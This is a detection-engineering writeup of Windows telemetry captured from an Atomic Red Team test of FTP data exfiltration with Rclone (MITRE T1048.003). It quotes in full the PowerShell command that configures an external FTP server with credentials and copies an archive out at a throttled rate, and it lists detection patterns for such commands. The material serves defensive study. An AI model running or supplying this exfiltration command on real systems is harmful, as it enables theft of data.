# T1048.003-7: Exfiltration Over Unencrypted Non-C2 Protocol — Exfiltration Over Alternative Protocol - FTP - Rclone

## Technique Context

T1048.003 (Exfiltration Over Unencrypted Non-C2 Protocol) represents data exfiltration using standard network protocols not typically associated with command and control communications. FTP exfiltration is particularly common in enterprise environments where legitimate FTP usage may blend with malicious activity. Rclone is a legitimate cloud storage management tool that adversaries increasingly abuse for data exfiltration due to its built-in support for numerous protocols including FTP, cloud storage providers, and encrypted transfers.

This technique matters because it leverages trusted protocols and tools, making detection challenging through traditional network monitoring alone. Attackers use Rclone specifically because it appears legitimate, supports bandwidth limiting to avoid detection, and can handle large data transfers efficiently. The security community focuses on detecting unusual command-line patterns, unexpected network destinations, and process behaviors that indicate data staging and transfer operations.

## What This Dataset Contains

The dataset captures a complete FTP exfiltration scenario using Rclone executed through PowerShell. Key evidence includes:

**PowerShell Script Execution**: Security event 4688 shows the primary PowerShell command: `"powershell.exe" & {$rclone_bin = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName $exfil_pack = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName &$rclone_bin config create ftpserver \"ftp\" \"host\" ftp.dlptest.com \"port\" 21 \"user\" dlpuser \"pass\" rNrKYTX9g7z3RgJRmxWuGHbeu &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate}`

**PowerShell Logging**: Event 4104 captures the script block creation with the complete Rclone command syntax, including FTP server configuration (`ftp.dlptest.com`), credentials (`dlpuser`/`rNrKYTX9g7z3RgJRmxWuGHbeu`), and transfer parameters with bandwidth limiting (`--bwlimit 2M`).

**Process Chain**: Sysmon event 1 shows the execution chain from parent PowerShell (PID 14024) spawning the child PowerShell process (PID 14576) containing the Rclone commands, along with a `whoami.exe` execution for system reconnaissance.

**File System Activity**: Sysmon event 11 shows PowerShell profile file creation, indicating the script environment setup.

## What This Dataset Does Not Contain

**Rclone Binary Execution**: No Sysmon ProcessCreate events for rclone.exe itself, likely because the Atomic Red Team test didn't include the actual Rclone binary in the test environment, causing the PowerShell script to fail at runtime.

**Network Connections**: No Sysmon event 3 (NetworkConnect) events showing the actual FTP connections to `ftp.dlptest.com:21`, confirming that the data transfer didn't occur.

**File Access to Exfil Data**: Missing Sysmon events showing access to the target file `exfil.zip`, indicating this file wasn't present during execution.

**DNS Resolution**: No Sysmon event 22 (DNSQuery) events for resolving `ftp.dlptest.com`, further evidence that network activity didn't occur.

**Success/Failure Indicators**: The PowerShell script shows no error handling or completion status, making it unclear whether the operation succeeded or failed.

## Assessment

This dataset provides excellent telemetry for detecting FTP exfiltration attempts using Rclone, despite the technique not completing successfully. The PowerShell logging is comprehensive, capturing both the command invocation (4103) and script block creation (4104) with full command-line parameters. Security event logging provides complete process creation details with embedded command lines.

The data strongly supports detection engineering for this technique class, particularly around suspicious PowerShell usage patterns and Rclone command-line syntax. The presence of FTP credentials in cleartext within the command line makes this especially detectable. However, the lack of actual network activity limits the dataset's utility for developing network-based detections or understanding the complete attack lifecycle.

## Detection Opportunities Present in This Data

1. **Suspicious PowerShell Command Patterns**: Detect PowerShell commands containing "rclone" combined with FTP-related parameters like "config create", "ftp", "host", "port", "user", "pass"

2. **Cleartext Credentials in Command Lines**: Monitor Security 4688 events for command lines containing potential credentials, especially when combined with network tools (passwords like "rNrKYTX9g7z3RgJRmxWuGHbeu")

3. **File Enumeration for Exfiltration**: Alert on PowerShell Get-ChildItem operations recursively searching specific directories (`C:\Users\Public\Downloads\`) for executables or archive files

4. **Rclone Configuration Commands**: Detect command lines containing "rclone config create" with protocol specifications, particularly non-corporate FTP servers

5. **Bandwidth Limiting Indicators**: Monitor for command-line parameters suggesting stealth data transfer (`--bwlimit`, `--ignore-existing`, `-q` for quiet mode)

6. **Multi-threaded Transfer Parameters**: Detect Rclone usage with high-performance transfer options (`--multi-thread-streams`, `--transfers`) indicating bulk data movement

7. **PowerShell Script Block Analysis**: Use event 4104 to detect script blocks containing file enumeration followed by external tool execution patterns

8. **External FTP Server Connections**: Correlate process creation containing external FTP hostnames (like `ftp.dlptest.com`) with potential data exfiltration tools
